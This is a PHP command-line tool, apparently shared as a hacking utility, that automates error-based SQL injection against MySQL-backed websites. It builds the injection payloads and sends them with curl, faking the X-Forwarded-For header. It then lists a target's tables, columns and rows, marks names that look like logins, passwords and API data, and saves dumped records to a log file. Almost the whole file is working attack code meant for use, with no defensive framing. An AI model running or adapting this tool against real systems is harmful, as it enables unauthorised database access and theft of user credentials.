<?php
/**
*
* @author Krypton a.k.a GreyCat - ExploreOurBrain
* @package Mini Exploit SQL Injection, Defacement Tools
* NB: support MySQL DBMS Only
*
**/
	require_once "colors.php";


	echo "____ ____ ____ ____ ____    ___  ____ ____ ____ ___     
|___ |__/ |__/ |  | |__/    |__] |__| [__  |___ |  \    
|___ |  \ |  \ |__| |  \    |__] |  | ___] |___ |__/    \n
    Mini Tool SQLi - By Krypton ~ ExploreOurBrain\n\n\n";


    $GLOBALS['params'] 	= "";
    $url 				= @$argv[1];
    $expUrl 			= explode("=", $url);
    $url 				= @$expUrl[1];

	if (stripos($argv[2], "--params") !== false) 
	{
		$arg2 = isset($argv[2]) ? $argv[2] : "";
		$arg3 = isset($argv[3]) ? $argv[3] : "";
		$arg4 = isset($argv[4]) ? $argv[4] : "";
	}
	else
	{
		$arg2 = isset($argv[2]) ? $argv[2] : "";
		$arg3 = isset($argv[3]) ? $argv[3] : "";
		$arg4 = isset($argv[4]) ? $argv[4] : "";
	}
	
	switch (true) {
		case (explode("=", $arg2)[0] == '--params') : 
			$params = str_replace("--params=", "", $arg2);
			
			if ($arg3 == '--tables')
			{
				new Exec($url);
				Exec::fetch_table($url);
			}

			if ($arg4 == '--columns') 
			{
				$url = str_replace("-u=", "", $argv[1]);
				new Exec($url);
				$table = explode("=", $arg3)[1];
				Exec::fetch_column($url,$table);
			}

			if ($argv[5] == '--dump') 
			{
				$url = str_replace("-u=", "", $argv[1]);
				new Exec($url);
				$table 		= explode("=", $arg3)[1];
				$columns 	= explode("=", $arg4)[1];
				Exec::fetch_data($url,$table,$columns);
			}

		break;
		case ($arg2 == '--tables'):
			$url = str_replace("-u=", "", $argv[1]);
			new Exec($url);
			Exec::fetch_table($url);
		break;
		//----//
		case ($arg3 == '--columns'):
			$url = str_replace("-u=", "", $argv[1]);
			new Exec($url);
			$table = explode("=", $arg2)[1];
			Exec::fetch_column($url,$table);
		break;
		case ($arg4 == '--dump'):
			$url = str_replace("-u=", "", $argv[1]);
			new Exec($url);
			$table 		= explode("=", $arg2)[1];
			$columns 	= explode("=", $arg3)[1];
			Exec::fetch_data($url,$table,$columns);
		break;

	}

	class ErrorBasedInj
	{
		private function _DumpTbs($i)
		{
			$query = " OR (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT table_name from information_schema.tables where table_schema=database() limit $i,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)-- -";

			return $query;
		}

		private function _DumpCols($tb='',$i='')
		{
			$query = " OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(column_name AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x".bin2hex($tb)." AND table_schema=DATABASE() LIMIT $i,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -";
			
			return $query;
		}

		private function _DumpData($tb='',$cols='',$i='')
		{
			$query = " OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(".str_replace(",", ",0x7c,", $cols).") AS CHAR),0x7e)) FROM ".$tb." LIMIT $i,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -";

			return $query;
		}

		public static function payloadRetrieve($type='',$url='',$i='',$tb='',$cols='')
		{
			$payload="";
			switch ($type) {
				case 'table':
					$payload = self::_DumpTbs($i);
					break;
				
				case 'columns':
					$payload = self::_DumpCols($tb,$i);
					break;
				case 'data':
					$payload = self::_DumpData($tb,$cols,$i);
					break;
			}

			$expParams = explode("&", $GLOBALS['params']);
			$putPayload = $expParams[0].$payload;
			unset($expParams[0]);
			$fixParams = $putPayload."&".implode("&", $expParams);

			if (empty($GLOBALS['params'])) 
			{
				$url = $url.urlencode($payload);
			}

			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_HTTPHEADER, array("REMOTE_ADDR: ", "HTTP_X_FORWARDED_FOR: 203.124.53.17"));
			
			if (!empty($GLOBALS['params'])) 
			{
				curl_setopt($ch, CURLOPT_POSTFIELDS, $fixParams);
			}

			curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
			$result = curl_exec($ch);

			preg_match_all('~(["\'])([^"\']+)\1~', strip_tags($result), $asw);
			$filterText = [];
			$check = "";
			foreach ($asw[0] as $key => $value) {
				if (strpos($value, ":1'") !== false) 
				{
					$filterText[] = $value;
				}
				else
				{
					$check = self::array_flatten($asw)[0];
					$filterText[] = $value;
					if ($check == self::array_flatten($asw)[0]) ;
				}
			}
			
			$hasData = "";
			if (!empty(@array_unique($filterText)[0])) 
			{
				$hasData = $filterText[0];
			}
			elseif (!is_array($filterText)) 
			{
				$hasData = $filterText;
			}
			else
			{
				die("\n");
			}


			$cleanText = str_replace("'", "",  str_replace("~1", "", $hasData));
			$data = explode(":", $cleanText)[0];
			if (curl_errno($ch)) 
			{
			    echo 'Error:' . curl_error($ch);
			}
			curl_close ($ch);

			return $data;
		}

		private function array_flatten($array) { 
			if (!is_array($array)) { 
				return FALSE; 
			} 
			$result = array(); 
			foreach ($array as $key => $value) { 
				if (is_array($value)) { 
					$result = array_merge($result, self::array_flatten($value)); 
				} 
				else { 
					$result[$key] = $value; 
				} 
			} 
			return $result; 
		} 

		public static function clean($string) {
		   $string = str_replace(' ', '-', $string);
		   return preg_replace('/[^A-Za-z0-9\-]/', '', $string);
		}
	}


	class Exec extends ErrorBasedInj
	{

		public function __construct($_URL){
			echo "[+] Website :".$_URL."\n";
		}

		public function fetch_table($expUrl='')
		{
			$colors 	= new Colors();
			$arrData 	= [];
			$displayURL = $expUrl;

			$info ="";
			$info .= "\n----------------------------------------------\n";
			$info .= "Webshit 	: ".$expUrl."\n";
			$info .= "----------------------------------------------";
			echo $info;		

			foreach ( range(0, 99999) as $key => $value ) 
			{
				$res = parent::payloadRetrieve("table",$expUrl,$value);
				

				if ( parent::clean($res) ) 
				{
					//sorry for using bubble logic operator
				    if(
						stripos($res, "admin") !== false || 
						$res == "user" 					 ||
						$res == "users" 				 || 
						stripos($res, "login") !== false ||
						stripos($res, "auth")  !== false
					  )
					{
						echo "\n".$res.$colors->getColoredString(" - Probably Authentication Table", "green", "");
						continue;
					}
					elseif(stripos($res, "api") !== false)
					{
						echo "\n".$res.$colors->getColoredString(" - Probably API Table", "yellow", "");
						continue;
					}
					echo "\n".$res;
				}
				else
				{
					echo "\n";
					exit();
				}
			}
		}

		public function fetch_column($expUrl='',$tb='')
		{
			$colors 	= new Colors();
			$arrData 	= [];
			$displayURL = $expUrl;

			$info ="";
			$info .= "\n----------------------------------------------\n";
			$info .= "Webshit : ".$expUrl."\n";
			$info .= "Table   : ".$tb."\n";
			$info .= "----------------------------------------------";
			echo $info;		

			foreach ( range(0, 99999) as $key => $value ) 
			{
				$res = parent::payloadRetrieve("columns",$expUrl,$value,$tb);
				if ( parent::clean($res) ) 
				{
					if(
						stripos($res, "pass") !== false 	||
						stripos($res, "pwd") !== false  	||
						stripos($res, "passwd") !== false 	||
						stripos($res, "user") !== false 	||
						stripos($res, "adm") !== false 		
					){
						echo "\n".$res.$colors->getColoredString(" - Probably Sensitive Columns", "green", "");
						continue;
					}
					echo "\n".$res;
				}
				else
				{
					echo "\n";
					exit();
				}
			}
		}

		public function fetch_data($expUrl='',$tb='',$cols='')
		{

			$colors 	= new Colors();
			$arrData 	= [];
			$displayURL = $expUrl;

			$validate = "";
			$info ="";
			$info .= "\n----------------------------------------------\n";
			$info .= "Webshit : ".$expUrl."\n";
			$info .= "Table   : ".$tb."\n";
			$info .= "Colums  : ".$cols."\n";
			$info .= "----------------------------------------------";
			echo $info;			
			self::writeLog($info);
			foreach ( range(0, 99999) as $key => $value ) 
			{
				$res = parent::payloadRetrieve("data",$expUrl,$value,$tb,$cols);
				$validate = $res;

				if ($validate == $res) 
				{
					echo "\n".$res."\n";
				}

				self::writeLog($res);
			}
		}

		public function writeLog($content='')
		{
			$current = file_get_contents('log.txt');
			$current .= "".$content."\n";
			$current .= ""."-----------------------"."\n";
			file_put_contents('log.txt', $current);

			return true;
		}
	}
?>